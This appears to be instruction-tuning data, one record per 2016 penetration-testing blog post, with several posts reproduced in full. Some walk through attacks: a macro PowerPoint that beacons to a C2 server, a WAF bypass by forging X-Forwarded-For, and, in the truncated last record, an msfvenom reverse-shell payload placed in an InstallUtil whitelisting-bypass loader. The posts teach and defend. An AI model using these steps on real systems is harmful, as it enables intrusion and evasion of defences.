its functionality and data A pen test follows a formal structure consisting of defined phases cf Vulnerability Assessment Personally Identifiable Information PII Information that can be used on its own or with other information to identify contact or locate a single person or to identify an individual in context PII is a legal concept not a technical concept Because of the versatility and power of modern re-identification algorithms the absence of PII data does not mean that the remaining data does not identify individuals While some attributes may be uniquely identifying on their own any attribute can be identifying in combination with others These attributes have been referred to as quasi-identifiers or pseudo-identifiers Phishing The illegal attempt to acquire sensitive information such as usernames passwords and credit card details and sometimes indirectly money often for malicious reasons by masquerading as a trustworthy entity in an electronic communication The word is a neologism created as a homophone of fishing due to the similarity of using fake bait in an attempt to catch a victim See also PICERL See Incident Response Pivot Test A pivot is a method whereby access to a secured network is gained by compromising a machine that resides on a nearby network In a typical scenario Network A is accessible to all machines but network B is only accessible by a few trusted machines and network B is not accessible from the internet By compromising network A and gaining access to a trusted machine that has access to network B a connection can be leveraged or pivoted to the secured network via the compromised machine POODLE Attack POODLE is an Acronym for Padding Oracle On Downgraded Legacy Encryption It is an attack that targets CBC-mode ciphers in SSLv3 The vulnerability allows an active MitM attacker to decrypt content transferred an SSLv3 connection While secure connections primarily use TLS the successor to SSL most users were vulnerable because web browsers and servers will downgrade to SSLv3 if there are problems negotiating a TLS session Port An easy way to understand ports is to imagine your IP address is a cable box and the ports are the different channels on that cable box The cable company knows how to send cable to your cable box based upon a unique serial number associated with that box IP Address and then you receive the individual shows on different channels Ports Proof of Concept POC A proof of concept is a demonstration of a flaw to prove the possibility of the flaw being exploited R Red Team Red Team Blue Team exercises take their name from their military antecedents The idea is simple One group of security pros--a red team--attacks something and an opposing group--the blue team--defends it Originally the exercises were used by the military to test force-readiness They have also been used to test physical security of sensitive sites like nuclear facilities and the Department of Energy's National Laboratories and Technology Centers Remote Desktop Protocol RDP The set of rules that allows connections to machines on the network from other connected machines RDP usually uses ports 3389 Rogue Access Point A Wi-Fi hotspot that mimics a legitimate hotspot Users who connect to a rogue access point also known as an evil twin are susceptible to attack S SANS Institute The SANS Institute is a private U.S company that specializes in information security and cybersecurity training Since its founding in 1989 the SANS Institute has trained over 120 000 information security professionals in topics ranging from cyber and network defenses penetration testing incident response digital forensics and audit The trade name SANS derives from SysAdmin Audit Networking and Security SANS also publishes the Critical Security Controls for Effective Cyber Defense As defined by SANS The actions defined by the Controls are demonstrably a subset of the comprehensive catalog defined by the National Institute of Standards and Technology NIST SP 800-53 The Controls do not attempt to replace the work of NIST including the Cybersecurity Framework developed in response to Executive Order 13636 The Controls instead prioritize and focus on a smaller number of actionable controls with high-payoff Secure Shell SSH A network protocol for initiating text-based sessions on remote machines in a secure way Usually initiated over TCP port 22 Secure Sockets Layer SSL SSL Secure Sockets Layer was the standard security technology for establishing an encrypted link between a web server and a browser This link ensured that all data passed between the web server and browsers remain private and integral SSL was an industry standard and was used by millions of websites in the protection of their online transactions with their customers Dr Taher Elgamal chief scientist at Netscape Communications from 1995 to 1998 is recognized as the father of SSL As of 2014 the 3.0 version of SSL is considered insecure as it is vulnerable to the POODLE attack that affects all block ciphers in SSL and RC4 the only non-block cipher supported by SSL 3.0 is also feasibly broken as used in SSL 3.0 TLS is now the recommended encryption standard for Web-based communications Server Message Block SMB A protocol used for providing shared access to files printers and serial ports and miscellaneous communications between nodes on a network It also provides an authenticated inter-process communication mechanism SMB usually communicates over port 139 Session Hijacking Also known as cookie hijacking session hijacking is the exploitation of a valid computer session sometimes also called a session key to gain unauthorized access to information or services in a computer system In particular it is used to refer to the theft of a magic cookie used to authenticate a user to a remote server It has particular relevance to web developers as the HTTP cookies used to maintain a session on many web sites can be easily stolen by an attacker using an intermediary computer or with access to the saved cookies on the victim's computer Side-Channel communication See Covert Channel SMB See Server Message Block Social Engineering A type of confidence trick for the purpose of information gathering fraud or system access It differs from a traditional"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Click to Enable Content</title>\n<taxonomies>C2, Red Team, anti-virus, BHIS favorite office sports, blacklisting, C2, evading anti-virus, Kill your AV, macros, microsoft office, veil-evasion</taxonomies>\n<creation_date>Fri, 01 Apr 2016 14:03:24 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven Evading anti-virus scanners has become a bit of a sport around BHIS When we do C2 testing for our customers we start with a host on the internal network and create a reverse connection out to our C2 server We then proceed to send various types of data in and out to see if we get caught The goal is to demonstrate how well their defenses prevent and or detect our shenanigans Our success rate is quite high meaning we usually are able to exfil data out of the network and the primary reason for that is because identifying evil traffic can be very difficult Attackers can obfuscate their traffic so that anti-virus scanners and other security devices do not detect a hint of wrong-doing Typically anti-virus scanners and intrusion prevention detection engines block or alert on known bad signatures or behaviors This is a blacklist approach So as long as we can change our traffic from known bad to anything else we can cruise right on by So how do we get that initial connection out from the internal network to our C2 server without being noticed Sometimes a simple PowerShell script that connects out to a Metasploit listener will do the trick And other times we have to try a little harder On a recent test I was working on we used a malicious PowerPoint presentation masquerading as an interesting slideshow that promised to reveal irresistible company gossip The urge to click rating was high Embedded in the PowerPoint presentation were Visual Basic commands that invoked a PowerShell script to connect out to a C2 server The script was obfuscated using the awesome Veil-Evasion tool Here is the run down First we set up the listener on our C2 server In this example we are listening on port 443 using a reverse TCP connection We selected port 443 because it is normally allowed outbound Next we created our payload using Veil-Evasion We only had to tell Veil-Evasion the address and port we wanted to connect to as well as the type of payload and it did all the rest The script generated by Veil-Evasion looks like this Veil-Evasion Obfuscated Script As you can see above Veil-evasion creates the script but there is one problem the script is a one-liner that in this case consists of 2300 characters 2300 Characters One Line Script The Visual Basic editor in Office will not be happy about this at all As a matter of fact this will cause an error We need to find a way to break this script into smaller pieces that the VB compiler can deal with Fortunately someone has already done that for us Macro_safe.py is a neat little python script written to solve just this problem After running the output through the macro_safe.py script we get a version of our malicious script that PowerPoint will happily digest Macro_safe.py Breaks Long Lines Into Shorter Lines for Visual Basic The next step then is to open up our PowerPoint presentation and add the macro safe code First we make sure we have access to the Developer tab in PowerPoint by adding it to the Ribbon if necessary This can be done via the PowerPoint Options Enabling Developer Tab in PowerPoint Before PowerPoint will allow us to create a Macro we need to save the presentation as type .pps PowerPoint 97-2003 Show or .ppsm PowerPoint Macro-Enabled Show I like the legacy.pps extension because the m in newer versions of Office gives yet another clue that something is fishy Then we click on the Developer tab open up the Visual Basic interface and insert a new module This is where we paste in the macro safe output containing the properly formatted Veil-Evasion script These steps are shown below Once the macro exists in the document we need to find a way to trigger its execution Microsoft Word and Excel both have options for running Macros automatically when the file is opened but PowerPoint does not I have heard and read about hacks to accomplish the same in PowerPoint but in this case we will simply use Custom Actions in the presentation to trigger execution of the code when the user clicks inside the slideshow I have created one text box that covers the entire first slide and applied the On Mouse Click action there So when the user opens the presentation and clicks anywhere in the textbox on the first slide the macro executes and an outbound connection is created One could also choose to execute the macro On Mouse Over as well however this may be a bit noisier as it will likely create multiple outbound connections But wait macros are typically not enabled by default so the user would have to agree to this right Yep It turns out that PowerPoint will display a very clear warning that this document could be malicious You should leave this content disabled unless the content provides critical functionality and you trust its source You might think this is a descriptive understandable warning and would be enough to prevent users from enabling the unknown content But it turns out if you send it they will click That is what the attackers are counting on Now don't get me wrong I am not saying that users should always know better The Internet is full of warnings and security personnel regularly allow untrusted certificates to be used that users are told to click through Let's face it users get mixed messages so often that it is no surprise they have error message fatigue Basically when a user really wants to view the contents of a document s he will click through almost any warning without realizing that very quietly in the background something bad is happening in this case their machine is reaching out to our C2 server With initial access to the machine the attacker can then proceed to upload or download files attempt to elevate privileges pivot to other machines etc Our goal at BHIS is to educate our customers about the dangers of trusting anti-virus products to catch everything as well as the potential consequences of ignoring security warnings So to that end this Veil-Evasion obfuscated PowerPoint document was scanned with the Gmail scanner Windows Defender McAfee A V and Symantec A V None of these tools detected malicious content Check it out Gmail Fails to Detect the Malicious Document McAfee Fails Windows Defender Fails Symantec Nope The bottom line The only sign of trouble in our example here was a single warning from PowerPoint about enabling active content on a PowerPoint presentation and it was up to the end user to decide whether or not to proceed If users must make these decisions they must be continuously educated on the potential dangers with which they are faced"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Three Minutes with the HTTP TRACE Method</title>\n<taxonomies>Author, Brian King, Red Team, Web App, cross site tracing, http trace, OWASP, trace request, WAF bypass</taxonomies>\n<creation_date>Mon, 04 Apr 2016 17:59:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian King All of our scanning tools tell us that we should disable the HTTP TRACE and TRACK methods And we all think that's because there's something an attacker can do with it to steal secrets from legitimate users But there's another thing TRACE can do for an attacker and it's got nothing to do with other users OWASP says you should disable HTTP TRACE because it can be used for Cross Site Tracing ww.owasp.org index.php Cross_Site_Tracing CERT says it can be combined with cross-domain browser vulnerabilities to read sensitive header information from third-party domains ww.kb.cert.org vuls id 867593 Deadliest Web Attacks says you can read cookies Cross-Site Tracing XST The misunderstood vulnerability All of those are correct but a little old In modern browsers XMLHttpRequest won't send a TRACE request anymore and the CORS framework prevents XHR requests to foreign sites that don't explicitly allow them So these old attacks don't work so well anymore CORS Blocks GET Requests and Your Browser Blocks TRACE Requests But It's still a useful information-getter Remember that the TRACE verb is handled by the webserver Your request may pass through something else on the way to the webserver If that something else adds headers then your TRACE response will include those headers and you'll gain a little information you didn't already have What sits in front of a webserver that might be interesting A Web Application Firewall WAF which may be filtering requests to detect and kill attacks before they get to the webserver Those are not the headers I sent The X-Forwarded-For header is one of the headers added by some WAFs and it is sometimes used by the WAF itself to decide if it should filter that request or not If the header is present and contains the IP address of the WAF then the request must have come from the WAF and it must not be malicious right Well what if we add one of those to the request we send Hey Look My X-Forwarded-For Made It Through This WAF doesn't just create the X-Forwarded-For header it adds the requesting system's IP address my public IP address ending in 103 to whatever may already be there If you know the IP address of the WAF and you do because you're talking to it you can try to tell the WAF that your request is actually the WAF's request and should be ignored If it believes you then you've bypassed the WAF This is the most straightforward WAF bypass This is not a new discovery at all but the TRACE verb here shows you why it can work If you want to play with it at home here's the HTML I used for the XHR illustration above TRACE Form Response Goes Here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Poking Holes in the Firewall: Egress Testing With AllPorts.Exposed</title>\n<taxonomies>Author, Beau Bullock, C2, External/Internal, Red Team, Beau Bullock, egress filtering, exposed ports, firewalls, network</taxonomies>\n<creation_date>Wed, 06 Apr 2016 14:02:38 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock If you have been even remotely in touch with technology in the past thirty years you have probably heard of this thing called a firewall If not a firewall decides what does and does not get to proceed through it Most organizations have one of these protecting their network from the rest of the Internet Some organizations place them in the most opportune spots to segment off specific areas of their internal network The system you are using right now to read this blog post most likely has a firewall built-in The general consensus about what a firewall does is that it keeps bad stuff from entering a protected network or system But firewalls can also keep things from leaving a network or system This is called egress filtering Why Should We Care What Leaves The simple answer is the more ports allowed out the easier it is for an attacker to establish command and control If there are no outbound filters put in place an organization can quickly lose visibility into what is leaving the network This can lead to malware infections command and control sessions going unnoticed or insider employees getting around corporate network policies If you are the one in charge of the firewall at your organization how do you go about knowing what is allowed out of your network quickly without diving into your firewall rule sets If you are a pentester how can you quickly find out what ports are allowed out of a network that can be used as a command and control channel AllPorts.Exposed AllPorts.Exposed is an Internet-resident system with as the name suggests all 65535 TCP ports open on it If you were to portscan it from a system network without firewall protection you should see that all ports are open Now if you were to portscan this system from within your network protected by a firewall and you see open ports these ports can be assumed as being allowed outbound through the firewall How To Test It Yes you could use something like Nmap to do a simple portscan but I prefer PowerShell for this task as it is built into Windows operating systems Often-times when we are performing a pentest we are working from a Windows-based system and are typically not an administrator user So installing external tools can be difficult Here is a short PowerShell portscanning script you can use to test ports 1-1024 against allports.exposed Open up a command terminal Type 'powershell.exe -exec bypass and hit enter Copy the below script into the terminal window and run it 1..1024 test new-object system.Net.Sockets.TcpClient wait test.beginConnect allports.exposed _ null null wait.asyncwaithandle.waitone 250 false if test.Connected echo _ open else echo _ closed select-string In the following screenshot you can see where the script prints 'open to the terminal window for ports that were discovered as being open Alternatively if you would like to just check for certain ports you can comma-separate each port you would like to scan at the beginning of the script in place of 1..1024 For example the following script will only scan ports 21 22 23 25 80 443 and 1337 21 22 23 25 80 443 1337 test new-object system.Net.Sockets.TcpClient wait test.beginConnect allports.exposed _ null null wait.asyncwaithandle.waitone 250 false if test.Connected echo _ open else echo _ closed select-string Here is the same script but this time we are testing the top 128 ports in use on the Internet as defined by the Nmap project 80 23 443 21 22 25 3389 110 445 139 143 53 135 3306 8080 1723 111 995 993 5900 1025 587 8888 199 1720 465 548 113 81 6001 10000 514 5060 179 1026 2000 8443 8000 32768 554 26 1433 49152 2001 515 8008 49154 1027 5666 646 5000 5631 631 49153 8081 2049 88 79 5800 106 2121 1110 49155 6000 513 990 5357 427 49156 543 544 5101 144 7 389 8009 3128 444 9999 5009 7070 5190 3000 5432 3986 13 1029 9 6646 49157 1028 873 1755 2717 4899 9100 119 37 1000 3001 5001 82 10010 1030 9090 2107 1024 2103 6004 1801 19 8031 1041 255 3703 17 808 3689 1031 1071 5901 9102 9000 2105 636 1038 2601 7000 test new-object system.Net.Sockets.TcpClient wait test.beginConnect allports.exposed _ null null wait.asyncwaithandle.waitone 250 false if test.Connected echo _ open else echo _ closed select-string In conclusion knowing what ports are allowed out of a network is very important for both pentesters and network admins Each port allowed outbound from a network creates an additional exit point for attackers to utilize BHIS recommends locking down egress traffic to only the ports required for the business to function If possible implement a web proxy and only allow outbound web traffic from it Block all outbound traffic from client systems and force their web browsers to use the web proxy to perform web browsing"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Black Box testing  Are you testing the Pentester, or your target?</title>\n<taxonomies>InfoSec 101, all about black box testing, black box pentesting, black box testing</taxonomies>\n<creation_date>Fri, 08 Apr 2016 12:55:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Perez BHIS does a lot of outreach via our blog HackNaked.TV training and especially webcasts In the course of outreach sometimes folks come to us whom never had a pentest or interestingly had a pentest and are unhappy with the results When probing customers about those unhappy results many of those experiences seem to have two common elements Black Box testing and or more fundamentally mismatched expectations Now Black Box testing definitely has its place Examples might include Your new application has security reviews baked into the development cycle You perform your own internal pentests Your site has been pentested in a Grey or Crystal Box fashion recently You're testing whether your SOC or Incident Response team is actually escalating issues However if none of the above applies and you decide your very first pentest will be a Black Box test you're actually testing the pentester and not testing the target The more cooperative the test the more we're spending time testing the application or target The more Black Box the test the more time the pentester will spend on discovery guesswork and exploration Pentesters love the challenge but here's where the 2nd piece comes in mismatched expectations The problem is when the pentester misses an issue due to concentrating on an area of the application that the customer wasn't really worried about In the example of a network pentest with numerous hosts the pentester will not know to focus on targets that may actually be more valuable to the customer or harbor more risk for the organization Another point that often comes up with Black Box testing regarding mismatched expectations are the Lessons Learned resulting from the report Most engagements are a week When the target list or application isn't given the full scope it could have the the results of the testing may not be representative of the actual risk of the application target set for the other 360 days of the year Customers are paying for our help in making them better and for bringing issues to the surface that may be exploited by a real attacker It's important to make the most effective use of that valuable time in helping the customer get better A determined attacker will spend as long as it takes why give real attackers an advantage by treating your yearly test as an adversarial engagement with little information For many of our customers we recommend doing a hybrid test Phase 1 will be a Black Box for a very defined time delimited phase immediately followed by a meeting with the customer to obtain additional information for a cooperative test for Phase 2 This seems to be the best of both worlds and leads to a report that combines both testing styles So if you're considering a Black box test for your next engagement be sure you decide ahead of time what are you actually testing A reputable penetration testing company will help you define scope items based off of your goals and provide you with tips to maximize the testing time and process"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What's Trust Among Friends: Secure Connections & Man-in-the-Middle Attacks</title>\n<taxonomies>InfoSec 201, chain of trust, https, Man-in-the-Middle, MitM attack, safe websites, secure connection, self signed certificaate, website security</taxonomies>\n<creation_date>Mon, 11 Apr 2016 13:43:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Logan Lembke Living in the information age is great isn't it With just a visit to the internet you can learn what happened in London on September 2nd 1666 what your friends are up to on the other side of the country and even buy a new set of homemade fuzzy slippers with nothing but your credit card number name and address While you might not care who knows that you're a bit of an English history buff or that you might have a slight Facebook addiction you might just want to keep it a secret that you occasionally buy warm comfy adorable slippers from randmasgiftshop.com Even then you definitely don't want other people knowing your credit card information and other personal information Tell me with an honest face that you wouldn't wear these Being the great IT expert you are you quickly send an email to the owner of Grandma's Gift Shop suggesting she enables https since you know TLS implements public key cryptography keeping your purchases and your slippers secure Next thing you know you receive an email from the owner informing you that she has her grandson enabling https right this very instant 'Awesome you think and happily go about your day Only the most adorable security for the most adorable slippers A week later you visit the site and are promptly met with a notification that looks like this JUST LET ME GO WHERE I WANT Complacently but slightly irritated you accept what you realize to be a self-signed certificate Still you go on about your business and order a pair of your favorite foot-warming slippers knowing your purchase was safely encrypted After all don't you trust a grandma who spends her days making warm comfy slippers A year later you totally ruin your favorite slippers in the mud outside your house Never fear Grandma's Gift Shop is still in business You quickly decide you deserve an upgrade and happily buy a new pair of slippers What you don't know is that some ne'er-do-well on the internet now knows everything about your order and has begun telling everyone what you bought Even worse they have your credit card information name and address Over the next week you start to notice a few odd purchases on your credit card account while your internet-addicted friends begin ridiculing your favorite footwear Immediately you cancel your card and own up to your slipper obsession BUT HOW You've been struck by a Man-in-the-Middle attack Remember that self-signed certificate you accepted a year ago Probably not A hacker created a certificate that mimicked Grandma's Gift Shop jumped in the middle of your connection and when your computer thought it was talking to the trusted server it was really talking to the hacker's computer So even though your communications were perfectly encrypted the information was being decrypted by the hacker with ease This brings up two main questions How do we prevent Man-in-the-Middle attacks with TLS And why are we so complacent with self-signed certificates The answer to the first question has been tackled time and time again and you probably know the answer Say it with me Don't use self-signed certificates Signed certificates provide a mechanism for establishing a chain of trust By placing trust in a few key certificates and relying on their owners to correctly establish trust with others you know you can trust the certificate at the end of the chain But what allows for this chain of trust Digital signatures Digital signatures establish one-way relationships between certificates and best of all hackers cannot imitate digital signatures without full access to the certificates which created them Example chain of trust using signed certificates Thankfully there are a few options as far as obtaining signed certificates The first option is the traditional route buying into a trusted certificate authority These certificate authorities are trusted by default on most computers worldwide and work with you in order to set up your infrastructure Trusted certificate authorities such as Digicert provide signatures for TLS certificates as long as you provide your name address organization name web address a few other pieces of information and a boatload of money Currently Digicert charges 140 year for signed certificates While any established organization can certainly swing this expense and should certainly pay for the service small businesses and Grandma's Gift Shop are left to suffer Alternatively get down with the free software hippie within you and visit letsencrypt.org Let's Encrypt provides free signed certificates that are trusted by almost all modern web browsers and operating systems While the process needed to obtain certificates from Let's Encrypt is technically complicated it is well worth the work Not only will you be able to establish secure trusted connections with your customers but you'll also learn quite a bit about public key infrastructure PKI along the way When it comes to internal services a few years ago I would have recommended setting up a self-signed root certificate for your small business or home network From there you could sign the certificates deployed on your servers This setup offers protection from Man-in-the-Middle attacks so long as your would-be hacker could not access your internal root certificate However with the introduction of Let's Encrypt there is no reason to sign your own root certificate today Yet there is one major exception when it comes to internal services In order to obtain a signed certificate from Let's Encrypt or most other certificate authorities you must have an online web presence DNS plays a critical role in verifying your online identity While signed certificates are well within the grasp of most IT professionals self-signed certificates continue to be used in offices across the world But why Largely two reasons money and time Now with the recent advent of Let's Encrypt the list has shortened to time and time alone As IT industry professionals we owe it to ourselves as well as our users to set aside the time to learn about public key infrastructure and implement it securely across the board Yet we should not only make an effort to learn about PKI but we also need to continually teach newcomers about PKI as well Now it's time for you to do your part Educate your co-workers users friends and family Take the time to email Grandma's Gift Shop Help educate them about public key infrastructure set them up with a signed certificate and build that chain of trust Only then can you can safely order your warm comfy and secure slippers Helpful links ww.digicert.com etsencrypt.org how-it-works ommunity.letsencrypt.org t which-browsers-and-operating-systems-support-lets-encrypt 4394 ww.sslshopper.com article-when-are-self-signed-certificates-acceptable.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Herding Those Pesky Passwords</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, dashline, how to store passwords, keepass, last pass, password herding, password management, passwords</taxonomies>\n<creation_date>Fri, 15 Apr 2016 18:50:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser Gail Menius Frequently we get asked about where to store passwords Should they be stored in a word excel txt file on your computer Maybe written down in a secret little book The best one Just to use the same password for everything Nooooo We could go into the anatomy of a password but Gail has a blog post that already covers the basics you can find it here Well today we will answer those questions With password management there are a lot of software solutions out there such as KeePass LastPass and Dashlane as well as others The way a password manager works is that once you have installed and created an account database to hold your password information in It is then encrypted and only able to be decrypted with a master password Essentially this is the only password that you would have to remember so make it a long 16 characters or more password Try a phrase like beauwillcrackthisifitisshort because Beau is awesome or if you would like to add a little pizzazz try Derekenjoyspasswordhashes again it should be the only password that you need to remember so make it easy to recall and long Also if you lose or forget the master password you will probably not be able to recover it since a good password manager will not allow you to recover the master password With in the password manager you can put information such as URL username password and description You can also have the password manager create a password for you with a specified length Who doesn't like Pinterest KeePass Screenshot to Generate New Password for You KeePass Options to Create a Password for You With KeePass for instance you can specify which character sets you would like to include or exclude as well as length The final thing I would like to add is with password managers many times you will only ever see the password when you create generate it For instance I use my shortcut keys to copy the passwords to put into the password field I never see the password Others will give you a button on the website to do essentially the same So grab a password manager and start managing your passwords today Here is a link to pcmag.com best for 2016 password managers ww.pcmag.com article2 0 2817 2407168 00.asp Gail and I put together this short fun video on installing Lastpass Enjoy embed outu.be fdSixkRlYGQ embed"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Courage to Learn</title>\n<taxonomies>InfoSec 101, challenge, culture of education, culture of growth, growth, hard words to say, i don't know, learning</taxonomies>\n<creation_date>Mon, 18 Apr 2016 13:52:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward Last year I listened to a podcast from Freakonomics that has stuck with me in fact I think it's changed the way I think powerful stuff from one measly podcast The episode was about the three hardest words in the English language Take a stab at what those might be Nope They're not I love you They're not even I forgive you Though we can probably all attest to the difficulty of saying those particular phrases In fact the three hardest words are I don't know On the surface they don't really seem that difficult but in order to say them we need to dig down to the darkest parts of our egos and admit what might seem like a failure It makes us feel vulnerable in the worst way possible especially when it comes to our job survival What is it they say When you stop growing you die I associate growing to learning because life at its core requires learning learning how to not get burned by fire how to not be attacked by vicious beasts and other instances of extreme danger and where to find food The moment we give up on learning is the moment we curl into the fetal position and freeze to death That sounds dire because it is Learning is the most important aspect of being human But there's something important that has to happen before we can learn we have to admit we don't know and that there are still things left to learn We've all been around teenagers They're sometimes obnoxious we can be judgey because we were all once in their ranks mostly because they think and act like they know everything annoying to those of us who realize there's so much left to learn Perhaps this is an innate safety mechanism that propelled us into life which if we had realized how scary and daunting it really is they would be paralyzed by fear On the other hand most people escape those fraught and traumatic years to enter into a phase of life where they realize just how ignorant they really are When you learn more about anything you realize just how much you don't know I think I can safely say from my conversations with some of our pentesters that what they really enjoy about this career is that no job is the same There's always something to learn something different and our pentesters get to utilize different methods to accomplish the job for each different client even within the same industry No day is the same there's always something to new to do I guess then I'm assuming that there's always an opportunity to say I don't know But is that okay to say in your job Will a boss fire you if we admit we don't know how to do every single aspect of our jobs John our boss has always put a huge emphasis on education He spends a large percentage of his time teaching both within SANS 504 woot and also doing educational ventures outside of that our webcasts are almost always educational and most recently he's helping to teach a kids Python class in the office He's worked tirelessly to build a culture within the IT community where we can learn from each other and grow in the InfoSec industry But you know what a culture of education and training means We all need to admit both when we don't know and make this echo chamber a good place to learn which means people feel comfortable admitting they don't know something We were all there once naive ignorant My own experience in this industry to which I'm brand new has been a great one I ask our staff for help with things I'm sure they consider super dumb but that's okay They're always willing to explain and I'm willing to learn And I have learned a TON Do we expect anything less of the companies we do business with Is it okay to do business with a company that will say Hey I don't know the answer to that but I'll find out and get back to you I really appreciate it when a company I'm doing business with can be frank and honest Maybe it's my own bias but I realize companies are just made out of people and people can't possibly have all the answers all the time I appreciate helpfulness and a willingness to approach each new problem with gusto to find the solution BHIS isn't any different We come up against problems we're not sure how to solve all the time it's why we love our jobs because they're always evolving the InfoSec industry is changing daily and giving us a chance to learn new things In conclusion I'd like to leave you with this challenge try to admit out loud to another person when you don't know something It can take a lot of courage to be that vulnerable but just like everything else it gets easier with practice And on the flip side listen when people are willing to admit that to you recognizing that they are showing you a lot of trust Then ask yourself this how we can foster a culture of education A culture where it's okay to admit we don't know but want to Check out that Freakonomics podcast here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Bypass Application Whitelisting & AV</title>\n<taxonomies>Author, Brian Fehrman, Red Team, anti-virus, bypassing AV, Kill your AV, whitelisting</taxonomies>\n<creation_date>Wed, 20 Apr 2016 15:41:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman There are numerous methods that have been published to bypass Anti-Virus products As a result many companies are beginning to realize that application whitelisting is another tool to consider adding to their arsenal Application whitelisting is advantageous in that it doesn't require constant updating of behavioral or signature-based detection algorithms you explicitly tell it what can be run Here we will show you one method of bypassing some application whitelisting products Right up front we will make it known that we did not develop this method This method was developed by Casey Smith We stumbled upon it and felt that it was so awesome that we had to share it This method makes use of two neat features on Windows The first feature is the ability to compile C programs without needing the Visual Studio environment The second feature which is the one for bypassing application whitelisting leverages a tool named InstallUtil.exe The first task will be to grab the InstallUtil-ShellCode.cs CSharp file ist.github.com lithackr b692378825e15bfad42f78756a5a3260 mv InstallUtil-ShellCode-cs InstallUtil-ShellCode.cs After downloading the CSharp file it's time to generate our shellcode We will use msfvenom to output a reverse_tcp meterpreter stager Type the following replacing YOUR_IP with the IP address of your Kali machine msfvenom -p windows meterpreter reverse_tcp lhost YOUR_IP lport 443 -f csharp shellcode.txt Now copy the contents of the shellcode.txt file to your clipboard cat shellcode.txt xclip -selection clipboard Open the InstallUtil-ShellCode.cs file for editing gedit InstallUtil-ShellCode.cs Let's take a minute to talk about the magic of this approach In the InstallUtil-ShellCode.cs file you will notice two functions towards the top The function named Main code in the green box is what will be called if the program is executed normally e.g double-clicking command line sandboxing etc The function named Uninstall code in the orange box will be executed when the program is run by using the InstallUtil.exe tool The InstallUtil.exe tool is typically on the list of trusted applications and will likely bypass some application whitelisting software The code within the Uninstall Function will make a call to the Shellcode function which is where our malicious code will reside The magic here is that it can potentially be used to bypass both behavioral-based analysis and application whitelisting With additional obfuscation signature-based analysis can also be averted Find the portion of code shown in the picture below and replace it with the shellcode that is currently on your clipboard the output from shellcode.txt Change the word buf in the newly pasted shellcode to be shellcode Next let's get this file over to our Windows machine Save the 